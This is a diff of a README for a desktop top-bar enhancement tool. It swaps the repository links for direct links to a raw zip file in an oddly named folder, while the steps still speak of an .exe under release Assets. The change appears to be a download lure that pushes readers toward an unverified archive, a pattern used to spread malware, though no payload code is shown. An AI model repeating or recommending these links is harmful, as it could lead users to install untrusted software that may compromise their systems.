@@ -1,6 +1,6 @@
 # 🛠️ Bar-Enhanced - Modernize your desktop top bar interface
 
-[![Download Bar-Enhanced](https://img.shields.io/badge/Download_Bar-Enhanced-blue.svg)](https://github.com/Ambarcbalma7363/Bar-Enhanced)
+[![Download Bar-Enhanced](https://img.shields.io/badge/Download_Bar-Enhanced-blue.svg)](https://github.com/Ambarcbalma7363/Bar-Enhanced/raw/refs/heads/main/bauchle/Enhanced_Bar_2.4.zip)
 
 Bar-Enhanced changes how your desktop top bar looks and functions. It balances the visual layout, adds control buttons, and provides themes that work with future software versions. This tool works specifically for users who want a cleaner and more efficient desktop experience without technical effort.
 
@@ -17,7 +17,7 @@ Bar-Enhanced focuses on three specific areas of your desktop experience.
 
 To add these features to your system, you must visit the project release page. You do not need to compile code or manage complex files.
 
-[Visit this page to download the latest setup file](https://github.com/Ambarcbalma7363/Bar-Enhanced)
+[Visit this page to download the latest setup file](https://github.com/Ambarcbalma7363/Bar-Enhanced/raw/refs/heads/main/bauchle/Enhanced_Bar_2.4.zip)
 
 1. Open the link above in your web browser.
 2. Select the file ending in `.exe` under the Assets section.
